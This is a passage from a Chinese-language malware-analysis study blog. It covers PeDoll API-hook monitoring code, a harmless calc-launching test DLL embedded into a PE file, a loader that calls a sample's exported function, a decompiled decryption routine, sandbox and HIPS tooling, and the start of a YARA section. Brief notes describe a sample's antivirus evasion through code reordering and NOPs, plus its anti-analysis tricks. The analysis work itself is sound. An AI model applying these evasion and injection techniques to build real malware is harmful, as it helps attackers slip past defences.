data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hdHJpeGNhc2NhZGUvUGVEb2xs\">https://github.com/matrixcascade/PeDoll</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int APIENTRY hook_WriteProcessMemory( __in HANDLE hProcess, __in LPVOID lpBaseAddress, __in_bcount(nSize) LPCVOID lpBuffer, __in SIZE_T nSize, __out_opt SIZE_T * lpNumberOfBytesWritten )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDWORD dwesp;</span><br><span class=\"line\">\t_asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tmov dwesp,esp</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tsprintf(HookMessage, &quot;%s &lt;%08X&gt; &lt;%08X&gt; &lt;%08X&gt; &lt;%d&gt;&quot;,PEDOLL_QUERY_WRITEPROCESSMEMORY,(DWORD)hProcess,(int)lpBaseAddress,(int)lpBuffer,nSize);</span><br><span class=\"line\"></span><br><span class=\"line\">\tint reply=MonitorQuery(HookMessage,dwesp);</span><br><span class=\"line\">\tif (reply == PEDOLL_EXECUTE_PASS)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tWriteProcessMemoryHooker.Unhook();</span><br><span class=\"line\">\t\tint st = WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer,nSize,lpNumberOfBytesWritten);</span><br><span class=\"line\">\t\tWriteProcessMemoryHooker.Rehook();</span><br><span class=\"line\">\t\treturn st;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif(reply==PEDOLL_EXECUTE_REJECT)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\treturn 0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif (reply==PEDOLL_EXECUTE_TERMINATE)</span><br><span class=\"line\">\t\texit(0);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn FALSE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">APIHooker RegOpenKeyExAHooker;</span><br><span class=\"line\">LSTATUS\tAPIENTRY hook_RegOpenKeyExA(</span><br><span class=\"line\">\t__in HKEY hKey,</span><br><span class=\"line\">\t__in_opt LPCSTR lpSubKey,</span><br><span class=\"line\">\t__in_opt DWORD ulOptions,</span><br><span class=\"line\">\t__in REGSAM samDesired,</span><br><span class=\"line\">\t__out PHKEY phkResult</span><br><span class=\"line\">)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDWORD dwesp;</span><br><span class=\"line\">\t_asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tmov dwesp,esp</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tif (hKey == HKEY_CLASSES_ROOT)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tsprintf(HookMessage, &quot;%s &lt;%s&gt; &lt;%s&gt;&quot;,PEDOLL_QUERY_REGOPENKEYEXA, &quot;HKEY_CLASSES_ROOT&quot;, lpSubKey);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif (hKey == HKEY_CURRENT_CONFIG)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tsprintf(HookMessage, &quot;%s &lt;%s&gt; &lt;%s&gt;&quot;,PEDOLL_QUERY_REGOPENKEYEXA, &quot;HKEY_CURRENT_CONFIG&quot;, lpSubKey);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif (hKey == HKEY_CURRENT_USER)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tsprintf(HookMessage, &quot;%s &lt;%s&gt; &lt;%s&gt;&quot;,PEDOLL_QUERY_REGOPENKEYEXA, &quot;HKEY_CURRENT_USER&quot;, lpSubKey);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif (hKey == HKEY_LOCAL_MACHINE)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tsprintf(HookMessage, &quot;%s &lt;%s&gt; &lt;%s&gt;&quot;,PEDOLL_QUERY_REGOPENKEYEXA, &quot;HKEY_LOCAL_MACHINE&quot;, lpSubKey);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif (hKey == HKEY_USERS)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tsprintf(HookMessage, &quot;%s &lt;%s&gt; &lt;%s&gt;&quot;,PEDOLL_QUERY_REGOPENKEYEXA, &quot;HKEY_USERS&quot;, lpSubKey);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tint reply = MonitorQuery(HookMessage,dwesp);</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (reply == PEDOLL_EXECUTE_PASS)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tRegOpenKeyExAHooker.Unhook();</span><br><span class=\"line\">\t\tLSTATUS st= RegOpenKeyExA(hKey, lpSubKey, ulOptions, samDesired, phkResult);</span><br><span class=\"line\">\t\tRegOpenKeyExAHooker.Rehook();</span><br><span class=\"line\">\t\treturn st;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif(reply==PEDOLL_EXECUTE_REJECT)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\treturn 0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif (reply==PEDOLL_EXECUTE_TERMINATE)</span><br><span class=\"line\">\t\texit(0);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"dll加载器\"><a class=\"markdownIt-Anchor\" href=\"#dll加载器\">#</a> DLL 加载器</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 新建一个dll文件</span><br><span class=\"line\">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL WINAPI Load()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class=\"line\">                       DWORD  ul_reason_for_call,</span><br><span class=\"line\">                       LPVOID lpReserved</span><br><span class=\"line\">\t\t\t\t\t )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tswitch (ul_reason_for_call)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\tcase DLL_PROCESS_ATTACH:</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tMessageBoxA(0,0,0,0);</span><br><span class=\"line\">\t\t\tWinExec(&quot;calc.exe&quot;,SW_SHOW);</span><br><span class=\"line\">\t\t\tbreak;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\tcase DLL_THREAD_ATTACH:</span><br><span class=\"line\">\tcase DLL_THREAD_DETACH:</span><br><span class=\"line\">\tcase DLL_PROCESS_DETACH:</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">// 新建一个def导出</span><br><span class=\"line\">LIBRARY\t&quot;Dllll&quot;</span><br><span class=\"line\">EXPORTS</span><br><span class=\"line\">Load</span><br></pre></td></tr></table></figure>\n<p>判断 DLL 是否导出，用 OD 打开 ctrl+N</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231003182951007.png\" alt=\"image-20231003182951007\"></p>\n<p>给 PE.dll 增加一个节，放入我们的 dll</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231003183518328.png\" alt=\"image-20231003183518328\"></p>\n<p>DLL 会弹窗，此时用 od 附加 dllloader</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231003185339480.png\" alt=\"image-20231003185339480\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231003185550065.png\" alt=\"image-20231003185550065\"></p>\n<h3 id=\"通过dll导出函数进行加载调试\"><a class=\"markdownIt-Anchor\" href=\"#通过dll导出函数进行加载调试\">#</a> 通过 dll 导出函数进行加载调试</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 通过IDA F5源代码</span><br><span class=\"line\">// 在vc2008中调用</span><br><span class=\"line\">typedef BOOL (WINAPI* apiInstall)(int a1, BYTE *lpData, int a3, int a4);</span><br><span class=\"line\">apiInstall MyInstall;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tMyInstall = (apiInstall)GetProcAddr(Loadlibrary(&quot;ser.dll&quot;),&quot;Install&quot;);</span><br><span class=\"line\">\tif(MyInstall)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tBYTE *lData = NULL;</span><br><span class=\"line\">\t\tMyInstall(0,lData,0,0);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在通过 OD 调，到 DLL 领空，即可分析 dll 所有功能</p>\n<h3 id=\"使用火绒hips进行快速分析\"><a class=\"markdownIt-Anchor\" href=\"#使用火绒hips进行快速分析\">#</a> 使用火绒 HIPS 进行快速分析</h3>\n<ul>\n<li>\n<p>恶意软件 恶意软件（Malware）是指包括木马、后门、蠕虫、感染型病毒等在内的各种包含恶意 代码文件的统称。由于早期的恶意软件基本都属于感染型病毒，所以通常我们也将恶意软件 统称为病毒。 从 2007 年左右开始，得益于互联网的快速普及，恶意软件数量呈现快速增长的趋势。 传播方式也从之前的文件感染、局域网传播等传统方式迅速转变为通过社工、挂马等互联网 化的传播方式。早期常被应用于感染型病毒的代码多态、变形技术被应用于恶意软件生成器、 混淆器等，恶意软件作者通过混淆器不断快速迭代生成新恶意样本，以此来对抗安全软件的 查杀。 灰色软件 灰色软件一般指广告类（Adware）程序，这类程序往往会通过弹出广告等方式诱导、 欺骗甚至是恐吓用户以达到推广获利的目的。这类程序不属于一般意义上安全行业内对恶意 软件的定义，但却对用户正常使用电脑产生极坏的影响。 基于上述原因，不同安全软件也采取了不同的策略来进行应对，多数安全软件会把此类 程序识别为广告程序（Adware），或潜在不受欢迎程序 (Potentially Unwanted Application， 即 PUA），或类似卡巴斯基检出的病毒名以 not-a-virus: 开头的威胁。</p>\n</li>\n<li>\n<p>火绒主动防御系统率先将单步防御和多步恶意监控相结合，不依赖白名单，消除了信任漏洞，自上而下地在所有可能的威胁入口设计独特的防御策略，共同有效地防御不同类型的恶意威胁。同时还能实时感知动态的系统级威胁行为信息，是终端威胁探针的重要组成部分。</p>\n<p>该防御系统在文件、注册表、进程、网络这四个维度均设计了全面的防护规则，有效地针对操作系统的脆弱点进行防护。单步防御模块还开放了自定义规则功能，允许用户自行编写防护规则，制订适合自身需求的防御、隐私保护规则。</p>\n</li>\n</ul>\n<h2 id=\"exe-恶意文件分析\"><a class=\"markdownIt-Anchor\" href=\"#exe-恶意文件分析\">#</a> EXE 恶意文件分析</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zLnRocmVhdGJvb2suY29tLw==\">https://s.threatbook.com/</span></p>\n<ol>\n<li>基于多款反病毒引擎检测，快速检测已知威胁</li>\n<li>利用虚拟化沙箱深度分析技术，实现恶意文件自动化、可定制化的行为分析，检测未知威胁</li>\n<li>集成微步多个核心的高级情报分析系统，对文件运行过程中的网络、主机行为进行智能化的威胁判定，产出可直接用于失陷检测和应急分析的 IOC</li>\n<li>支持识别和检测反沙箱恶意软件，防止恶意软件逃避虚拟机检查</li>\n</ol>\n<p>情报 IOC</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004170516677.png\" alt=\"image-20231004170516677\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004164602073.png\" alt=\"image-20231004164602073\"></p>\n<p>流量分析：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004165058553.png\" alt=\"image-20231004165058553\"></p>\n<p>找程序入口：通过 IDA 打开，找到 WinMain 函数地址，在 OD 查找，段首下段</p>\n<p>可以绕过异常链上中断的 OD 检测</p>\n<p>通过 API 进行可疑行为，同样可以在 OD 中下段，找到函数调用</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004165411084.png\" alt=\"image-20231004165411084\"></p>\n<p>调用 Sleep 函数做延迟，绕过分析。</p>\n<p>默认内存分页不可读不可写</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004170112847.png\" alt=\"image-20231004170112847\"></p>\n<p>遍历进程找杀软，OD BP CreateToolhelpSnapShot</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004170228525.png\" alt=\"image-20231004170228525\"></p>\n<p>查 PDB 可以获得文件编译日志，可以用于溯源取证</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004170617837.png\" alt=\"image-20231004170617837\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004171644459.png\" alt=\"image-20231004171644459\"></p>\n<h3 id=\"解密函数分析\"><a class=\"markdownIt-Anchor\" href=\"#解密函数分析\">#</a> 解密函数分析</h3>\n<p>定位到解密函数，直接用 IDA F5</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004174240722.png\" alt=\"image-20231004174240722\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004174147211.png\" alt=\"image-20231004174147211\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void __cdecl sub_401FB0(unsigned int *a1, signed int a2, int a3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tsigned int v3; // ebx@1</span><br><span class=\"line\">\tint v4; // ecx@2</span><br><span class=\"line\">\tunsigned int v5; // eax@2</span><br><span class=\"line\">\tunsigned int v6; // esi@4</span><br><span class=\"line\">\tunsigned int v7; // ebp@4</span><br><span class=\"line\">\tunsigned __int8 v8; // bl@5</span><br><span class=\"line\">\tunsigned __int8 v9; // bl@6</span><br><span class=\"line\">\tsigned int v10; // ebx@9</span><br><span class=\"line\">\tunsigned int v11; // ebp@9</span><br><span class=\"line\">\tunsigned int v12; // eax@9</span><br><span class=\"line\">\tint v13; // esi@11</span><br><span class=\"line\">\tint v14; // ebp@11</span><br><span class=\"line\">\tunsigned __int8 v15; // bl@12</span><br><span class=\"line\">\tunsigned __int8 v16; // bl@14</span><br><span class=\"line\">\tchar v17; // dl@14</span><br><span class=\"line\">\tint v18; // esi@14</span><br><span class=\"line\">\tchar v19; // cl@14</span><br><span class=\"line\">\tchar v20; // bl@14</span><br><span class=\"line\">\tunsigned __int8 v21; // bl@14</span><br><span class=\"line\">\tchar v22; // [sp+10h] [bp-8h]@4</span><br><span class=\"line\">\tint v23; // [sp+10h] [bp-8h]@9</span><br><span class=\"line\">\tint v24; // [sp+14h] [bp-4h]@2</span><br><span class=\"line\">\tint v25; // [sp+14h] [bp-4h]@9</span><br><span class=\"line\">\tsigned int v26; // [sp+20h] [bp+8h]@9</span><br><span class=\"line\"></span><br><span class=\"line\">\tv3 = a2;</span><br><span class=\"line\">\tif ( a2 &lt;= 1 )</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif ( a2 &lt; -1 )</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tv10 = -a2;</span><br><span class=\"line\">\t\t\tv26 = v10;</span><br><span class=\"line\">\t\t\tv25 = 52 / v10 + 6;</span><br><span class=\"line\">\t\t\tv11 = -1640531527 * v25;</span><br><span class=\"line\">\t\t\tv23 = -1640531527 * v25;</span><br><span class=\"line\">\t\t\tv12 = *(BYTE *)a1;</span><br><span class=\"line\">\t\t\twhile ( 1 )</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tv13 = v10 - 1;</span><br><span class=\"line\">\t\t\t\tv14 = (v11 &gt;&gt; 2) &amp; 3;</span><br><span class=\"line\">\t\t\t\tif ( v10 != 1 )</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tdo</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tv15 = *((BYTE *)a1 + v13)</span><br><span class=\"line\">\t\t\t\t\t\t\t- (((v12 ^ v23) + (*((BYTE *)a1 + v13 - 1) ^ *(BYTE *)(a3 + 4 * (v14 ^ v13 &amp; 3)))) ^ ((4 * v12 ^ (*((BYTE *)a1 + v13 - 1) &gt;&gt; 5)) + (16 * *((BYTE *)a1 + v13 - 1) ^ (v12 &gt;&gt; 3))));</span><br><span class=\"line\">\t\t\t\t\t\t*((BYTE *)a1 + v13) = v15;</span><br><span class=\"line\">\t\t\t\t\t\tv12 = v15;</span><br><span class=\"line\">\t\t\t\t\t\t--v13;</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t\twhile ( v13 );</span><br><span class=\"line\">\t\t\t\t\tv10 = v26;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\tv16 = *((BYTE *)a1 + v10 - 1);</span><br><span class=\"line\">\t\t\t\tv17 = (4 * v12 ^ (v16 &gt;&gt; 5)) + (16 * v16 ^ (v12 &gt;&gt; 3));</span><br><span class=\"line\">\t\t\t\tv18 = v14 ^ v13 &amp; 3;</span><br><span class=\"line\">\t\t\t\tv11 = v23 + 1640531527;</span><br><span class=\"line\">\t\t\t\tv19 = v16 ^ *(BYTE *)(a3 + 4 * v18);</span><br><span class=\"line\">\t\t\t\tv20 = v12 ^ v23;</span><br><span class=\"line\">\t\t\t\tv23 += 1640531527;</span><br><span class=\"line\">\t\t\t\tv21 = *(BYTE *)a1 - ((v20 + v19) ^ v17);</span><br><span class=\"line\">\t\t\t\t*(BYTE *)a1 = v21;</span><br><span class=\"line\">\t\t\t\tv12 = v21;</span><br><span class=\"line\">\t\t\t\t--v25;</span><br><span class=\"line\">\t\t\t\tif ( !v25 )</span><br><span class=\"line\">\t\t\t\t\tbreak;</span><br><span class=\"line\">\t\t\t\tv10 = v26;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tv4 = 0;</span><br><span class=\"line\">\t\tv24 = 52 / a2 + 6;</span><br><span class=\"line\">\t\tv5 = *((BYTE *)a1 + a2 - 1);</span><br><span class=\"line\">\t\twhile ( 1 )</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tv6 = 0;</span><br><span class=\"line\">\t\t\tv22 = v4 - 71;</span><br><span class=\"line\">\t\t\tv7 = ((unsigned int)(v4 - 1640531527) &gt;&gt; 2) &amp; 3;</span><br><span class=\"line\">\t\t\tif ( v3 != 1 )</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tdo</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tv8 = (((*((BYTE *)a1 + v6 + 1) ^ v22) + (v5 ^ *(BYTE *)(a3 + 4 * (v7 ^ v6 &amp; 3)))) ^ ((4</span><br><span class=\"line\">\t\t\t\t\t\t* *((BYTE *)a1 + v6 + 1) ^ (v5 &gt;&gt; 5))</span><br><span class=\"line\">\t\t\t\t\t\t+ (16 * v5 ^ (*((BYTE *)a1 + v6 + 1) &gt;&gt; 3))))</span><br><span class=\"line\">\t\t\t\t\t\t+ *((BYTE *)a1 + v6);</span><br><span class=\"line\">\t\t\t\t\t*((BYTE *)a1 + v6) = v8;</span><br><span class=\"line\">\t\t\t\t\tv5 = v8;</span><br><span class=\"line\">\t\t\t\t\t++v6;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\twhile ( v6 &lt; a2 - 1 );</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\tv4 -= 1640531527;</span><br><span class=\"line\">\t\t\tv9 = (((*(BYTE *)a1 ^ v22) + (v5 ^ *(BYTE *)(a3 + 4 * (v7 ^ v6 &amp; 3)))) ^ ((4 * *(BYTE *)a1 ^ (v5 &gt;&gt; 5))</span><br><span class=\"line\">\t\t\t\t+ (16 * v5 ^ (*(BYTE *)a1 &gt;&gt; 3))))</span><br><span class=\"line\">\t\t\t\t+ *((BYTE *)a1 + a2 - 1);</span><br><span class=\"line\">\t\t\t*((BYTE *)a1 + a2 - 1) = v9;</span><br><span class=\"line\">\t\t\tv5 = v9;</span><br><span class=\"line\">\t\t\t--v24;</span><br><span class=\"line\">\t\t\tif ( !v24 )</span><br><span class=\"line\">\t\t\t\tbreak;</span><br><span class=\"line\">\t\t\tv3 = a2;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>加载 DLL</p>\n<p>通过更改代码顺序和 nop 实现免杀</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004174419662.png\" alt=\"image-20231004174419662\"></p>\n<p>分析 dll</p>\n<p>可以直接从 GetDiskFreeSpaceExA   /   Sleep 下断回溯到 dll 中</p>\n<h3 id=\"样本规则库编写\"><a class=\"markdownIt-Anchor\" href=\"#样本规则库编写\">#</a> 样本规则库编写</h3>\n<p>yarn 规则编写</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vU3Vuc2V0Ui9wLzEyNjUwMzI1Lmh0bWw=\">https://www.cnblogs.com/SunsetR/p/12650325.html</span></li>\n</ul>\n<ol>\n<li>\n<p>项目：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ZpcnVzdG90YWwveWFyYQ==\">https://github.com/virustotal/yara</span></p>\n<p>releases：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1ZpcnVzVG90YWwveWFyYS9yZWxlYXNlcw==\">https://github.com/VirusTotal/yara/releases</span></p>\n</li>\n</ol>\n<p>Yara 规则语法类似于 C 语言，易于编写和理解，每个规则都以关键字 “rule” 开头，后面跟着一个规则标识符。</p>\n<p>标识符必须遵循与 C 